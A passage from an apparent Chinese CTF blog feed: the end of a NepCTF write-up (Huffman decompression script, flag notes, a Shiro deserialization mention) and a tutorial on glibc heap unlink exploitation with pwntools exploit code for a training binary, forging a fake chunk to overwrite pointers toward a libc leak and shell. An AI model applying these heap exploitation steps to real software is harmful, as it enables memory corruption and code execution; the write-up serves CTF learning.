builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>compressed_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>            byte <span class=\"token operator\">=</span> compressed_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">build_huffman_tree_from_bytes</span><span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    heap <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>HuffmanNode<span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">,</span> freq<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> byte<span class=\"token punctuation\">,</span> freq <span class=\"token keyword\">in</span> frequencies<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    heapq<span class=\"token punctuation\">.</span>heapify<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>        left <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        right <span class=\"token operator\">=</span> heapq<span class=\"token punctuation\">.</span>heappop<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        merged <span class=\"token operator\">=</span> HuffmanNode<span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> left<span class=\"token punctuation\">.</span>freq <span class=\"token operator\">+</span> right<span class=\"token punctuation\">.</span>freq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> left</pre></td></tr><tr><td data-num=\"81\"></td><td><pre>        merged<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> right</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        heapq<span class=\"token punctuation\">.</span>heappush<span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">,</span> merged<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token keyword\">return</span> heap<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decompress</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> output_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        frequencies_count <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        frequencies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>frequencies_count<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            freq <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>            frequencies<span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> freq</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>        root <span class=\"token operator\">=</span> build_huffman_tree_from_bytes<span class=\"token punctuation\">(</span>frequencies<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        build_huffman_codes<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> huffman_codes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        reverse_huffman_codes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>v<span class=\"token punctuation\">:</span> k <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> huffman_codes<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        decompressed_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            byte <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>            byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>                <span class=\"token keyword\">if</span> byte <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>                    code <span class=\"token operator\">+=</span> <span class=\"token string\">'0'</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>                <span class=\"token keyword\">if</span> code <span class=\"token keyword\">in</span> reverse_huffman_codes<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>                    decompressed_data<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>reverse_huffman_codes<span class=\"token punctuation\">[</span>code<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>                    code <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>decompressed_data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token comment\"># input_file = 'input.txt'</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    compressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'compressed.bin'</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    decompressed_file <span class=\"token operator\">=</span> <span class=\"token string\">'decompressed.txt'</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token comment\"># 压缩文件</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token comment\"># compress(input_file, compressed_file)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token comment\"># 解压缩文件</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    decompress<span class=\"token punctuation\">(</span>compressed_file<span class=\"token punctuation\">,</span> decompressed_file<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/wp/2.png\" alt=\"\"></p>\n<h4 id=\"3connectedfive\"><a class=\"markdownIt-Anchor\" href=\"#3connectedfive\">#</a> 3.ConnectedFive</h4>\n<p>五子连珠，到 42 即可拿 flag</p>\n<p><img data-src=\"/img/wp/3.png\" alt=\"\"></p>\n<h4 id=\"4checkin\"><a class=\"markdownIt-Anchor\" href=\"#4checkin\">#</a> 4.CheckIn</h4>\n<blockquote>\n<p>NepCTF H4ve_Fun_1N_This_Game}</p>\n</blockquote>\n<h4 id=\"5陌生的语言\"><a class=\"markdownIt-Anchor\" href=\"#5陌生的语言\">#</a> 5. 陌生的语言</h4>\n<p><img data-src=\"/img/wp/1.jpg\" alt=\"1\"></p>\n<p><img data-src=\"/img/wp/1691849788716.jpg\" alt=\"1691849788716\"></p>\n<p>对照码表：NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<p>NepCTF NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p>\n<h4 id=\"6小叮弹钢琴\"><a class=\"markdownIt-Anchor\" href=\"#6小叮弹钢琴\">#</a> 6. 小叮弹钢琴</h4>\n<p>音频有信息</p>\n<blockquote>\n<p>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</p>\n</blockquote>\n<blockquote>\n<p>-.–/—/…-/…/…/—/…-/.-…/-…/…-/…/./-/…/…/…/-/—/-…-/—/.-./…/—/–/./-/…/…/-./–.</p>\n</blockquote>\n<p>摩斯转化</p>\n<blockquote>\n<p>YOU SHOULD USE THIS TO XOR SOME THING</p>\n</blockquote>\n<p>异或字符串（16 进制转化）</p>\n<blockquote>\n<p>0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50 0x59 0x7f 0x50 0x11 0x14 0x6e 0x10 0x5d<br>\n0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50</p>\n</blockquote>\n<p>修改一下：找下规律去修改一下</p>\n<blockquote>\n<p>0x4e 0x65 0x70 0x43 0x54 0x46 0x7b 0x68 0x34 0x70 0x70 0x79 0x5f 0x70 0x31 0x34 0x4e 0x30 0x7d</p>\n</blockquote>\n<blockquote>\n<p>NepCTF h4ppy_p14N0}</p>\n</blockquote>\n<h4 id=\"7问卷\"><a class=\"markdownIt-Anchor\" href=\"#7问卷\">#</a> 7. 问卷</h4>\n<p><img data-src=\"/img/wp/image-20230813202714138.png\" alt=\"image-20230813202714138\"></p>\n<h2 id=\"2-pwn\"><a class=\"markdownIt-Anchor\" href=\"#2-pwn\">#</a> 2. pwn:</h2>\n<h4 id=\"hrp-chat-4\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-4\">#</a> HRP-CHAT-4</h4>\n<p><img data-src=\"/img/wp/image-20230813203342637.png\" alt=\"image-20230813203342637\"></p>\n<p><img data-src=\"/img/wp/image-20230813203738235.png\" alt=\"image-20230813204233847\"></p>\n<p>一直买直到破坏子线程，然后执行   Safe_Mode_Key</p>\n<p>得到 flag：This is your key!</p>\n<blockquote>\n<p>Nepctf  IAMFOUR_b924541f-bd73-16f1-418d-932d681eb691</p>\n</blockquote>\n<h4 id=\"hrp-chat-3\"><a class=\"markdownIt-Anchor\" href=\"#hrp-chat-3\">#</a> HRP-CHAT-3</h4>\n<p><img data-src=\"/img/wp/image-20230813204233847.png\" alt=\"image-20230813204233847\"></p>\n<p>把 Boss 能得到 flag，只能去抽奖，但抽不到最高的，但是 H3h3QAQ 够用了</p>\n<p><img data-src=\"/img/wp/image-20230813204151370.png\" alt=\"image-20230813204151370\"></p>\n<p><img data-src=\"/img/wp/image-20230813204502026.png\" alt=\"image-20230813204502026\"></p>\n<p>序号是 9</p>\n<p><img data-src=\"/img/wp/image-20230813204547270.png\" alt=\"image-20230813204547270\"></p>\n<p>得到 flag</p>\n<h2 id=\"3-web\"><a class=\"markdownIt-Anchor\" href=\"#3-web\">#</a> 3. web:</h2>\n<h4 id=\"ez_java_checkin\"><a class=\"markdownIt-Anchor\" href=\"#ez_java_checkin\">#</a> ez_java_checkin</h4>\n<p>shiro 反序列化</p>\n<p><img data-src=\"/img/wp/image-20230813205114576.png\" alt=\"image-20230813205114576\"></p>\n<p><img data-src=\"/img/wp/image-20230813205917940.png\" alt=\"image-20230813205917940\"></p>\n<p><img data-src=\"/img/wp/image-20230813210003062.png\" alt=\"image-20230813210003062\"></p>\n<p>得到 flag。</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/11/unlink/",
            "url": "https://yhuanhuan01.github.io/2023/08/11/unlink/",
            "title": "unlink",
            "date_published": "2023-08-11T05:56:52.000Z",
            "content_html": "<h1 id=\"pwn_unlink了解学习\"><a class=\"markdownIt-Anchor\" href=\"#pwn_unlink了解学习\">#</a> PWN_unlink 了解学习</h1>\n<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理：</h2>\n<p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p>\n<p><em>注意这里的是修改指针</em></p>\n<p>简单的介绍下 unlink，其实 ctfwiki 有介绍，这里简单介绍下：</p>\n<pre><code>1. 首先找到要进行unlink的chunk(这里记为P)的前后堆块，\n   FD = P-&gt;fd, BK = P-&gt;bk。\n\t\n2. 进行安全检查，glibc2.23的潦草判断条件如下\n   FD-&gt;bk == P, BK-&gt;fd == P。\n   \n3. 然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。\n\n4. 当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink\n</code></pre>\n<p>这里就是我们需要构造 fake_chunk 去绕过检查，利用 unlink 漏洞，去达到我们想要达成的效果。</p>\n<ul>\n<li>利用 pwn unlink 漏洞可以实现以下攻击：</li>\n</ul>\n<ol>\n<li><strong>泄露内存</strong>：通过 unlink 漏洞，可以将两个相邻的堆块合并，导致一个已经释放的堆块中的指针被篡改。通过修改指针的值，可以泄露堆中的敏感信息，如函数指针、堆块头部数据等。</li>\n<li><strong>任意内存写</strong>：通过 unlink 漏洞，可以修改已经释放的堆块的前后指针，从而实现任意内存写。这可以用来修改关键数据结构，如堆块头部、全局变量等，进而控制程序的执行流程。</li>\n<li><strong>执行任意代码</strong>：通过泄露函数指针或修改返回地址等方式，可以篡改程序的控制流，从而实现代码执行。这可以用来执行恶意代码、获取系统权限等。</li>\n</ol>\n<blockquote>\n<p><img data-src=\"/img/unlinkpic/unlink_smallbin_intro.png\" alt=\"img\"></p>\n</blockquote>\n<blockquote>\n<p>利用思路 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18y\">¶</span></p>\n<p>条件 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI18z\">¶</span></p>\n<ol>\n<li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li>\n<li>已知位置存在一个指针指向可进行 UAF 的 chunk</li>\n</ol>\n<p>效果 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI180\">¶</span></p>\n<p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p>\n<p>思路 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvZW4vcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsvI181\">¶</span></p>\n<p>设指向可 UAF chunk 的指针的地址为 ptr</p>\n<ol>\n<li>修改 fd 为 ptr - 0x18</li>\n<li>修改 bk 为 ptr - 0x10</li>\n<li>触发 unlink</li>\n</ol>\n<p>ptr 处的指针会变为 ptr - 0x18。</p>\n<p>光讲原理，很枯燥乏味。上个题目，提提兴趣。</p>\n</blockquote>\n<h3 id=\"题目来源\"><a class=\"markdownIt-Anchor\" href=\"#题目来源\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2hpdGNvbnRyYWluaW5nX3VubGluaw==\">题目来源：</span></h3>\n<h6 id=\"例行检查\"><a class=\"markdownIt-Anchor\" href=\"#例行检查\">#</a> 例行检查：</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115628259.png\" alt=\"image-20230811115628259\"></p>\n<h6 id=\"执行程序\"><a class=\"markdownIt-Anchor\" href=\"#执行程序\">#</a> 执行程序：</h6>\n<p><img data-src=\"/img/unlinkpic/image-20230811115714589.png\" alt=\"image-20230811115714589\"></p>\n<blockquote>\n<p>给了个菜单，一共 5 个 node。这里就不一一执行了。</p>\n</blockquote>\n<h6 id=\"ida看源代码\"><a class=\"markdownIt-Anchor\" href=\"#ida看源代码\">#</a> IDA 看源代码：</h6>\n<ul>\n<li>main:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811115907614.png\" alt=\"image-20230811115907614\"></p>\n<blockquote>\n<p>可以看到很多函数。这里简单讲一下吧。程序首先申请了 0x10 字节大小的堆空间。并将返回的指针赋予 v4 变量。将 v4 [0] 的函数指针指向 hello_message 内容，v4 [1] 的函数指针指向 goodbye_message 的内容。然后开头打印 v4 [0] 指向的内容。接着进行循环，每循环一次都会调用 menu 函数，并且输入一个不长于 8 字节的数字，然后将输入的数字转换成整数进行 switch 匹配。</p>\n</blockquote>\n<ul>\n<li>add_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811121510474.png\" alt=\"image-20230811121510474\"></p>\n<blockquote>\n<p>add 要求输入大小和内容。在这里可以很明显的发现一块 bss 段地址。因为 bss 段可以任意读写，所以可以通过 unlink 漏洞在 bss 段写入 got 地址，从而可以泄露 libc 地址</p>\n</blockquote>\n<ul>\n<li>remove_item:</li>\n</ul>\n<p><img data-src=\"/img/unlinkpic/image-20230811124741272.png\" alt=\"image-20230811124741272\"></p>\n<blockquote>\n<p>不存在 uaf 漏洞，但是可以利用 free 一个非 fastbins 大小的 chunk，去触发 unlink 漏洞。</p>\n</blockquote>\n<ul>\n<li>\n<p>change_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811124946810.png\" alt=\"image-20230811124946810\"></p>\n</li>\n</ul>\n<blockquote>\n<p>注释即使重点！</p>\n</blockquote>\n<ul>\n<li>\n<p>show_item:</p>\n<p><img data-src=\"/img/unlinkpic/image-20230811125058481.png\" alt=\"image-20230811125058481\"></p>\n</li>\n</ul>\n<blockquote>\n<p>利用这里的输出，可以去打印处 libc 地址</p>\n</blockquote>\n<h6 id=\"exp构造过程\"><a class=\"markdownIt-Anchor\" href=\"#exp构造过程\">#</a> exp 构造过程：</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n </span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>首先 make chunk。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span><span class=\"token comment\">#指向 itemlist 内容</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token comment\">#堆溢出，改写 chunk1 的头，为后续 unlink 触发。</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#触发 unlink, 使 chunk0 指向 itemlist 内容</span></pre></td></tr></table></figure><p>接下来就是泄露 libc，然后去覆盖 got 地址。执行 shell 函数。</p>\n<h6 id=\"最终的exp\"><a class=\"markdownIt-Anchor\" href=\"#最终的exp\">#</a> 最终的 exp：</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token 